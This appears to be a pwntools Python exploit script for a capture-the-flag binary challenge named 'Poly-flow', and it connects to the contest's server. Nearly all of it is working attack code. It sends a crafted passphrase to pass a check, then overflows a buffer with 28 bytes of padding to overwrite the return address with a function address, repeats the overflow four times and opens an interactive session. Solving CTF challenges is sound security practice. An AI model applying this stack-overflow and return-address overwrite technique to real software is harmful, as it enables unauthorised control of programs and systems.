from pwn import *

# p = process('./Poly-flow')
p = connect('binary.challs.pragyanctf.tech', 6002)

#########################################
### Stage 1: Satisfy check() function ###
#########################################
# scanf
payload1 = b'\x3b\x2f\x2b\x37\x3b\x2f\x2b\x37\x3b\x2f\x2b\x37\x3e\x31\x2c\x39'

# fgets
payload1 += b'A'*(28)             # Padding
payload1 += p32(0x08049860)       # input function
p.sendlineafter(b'passphrase: ', payload1)

#########################
### Stage 2: Get flag ###
#########################
for i in range(4):
    p.sendline(payload1[16:])     # The same with padding and input() function

p.interactive()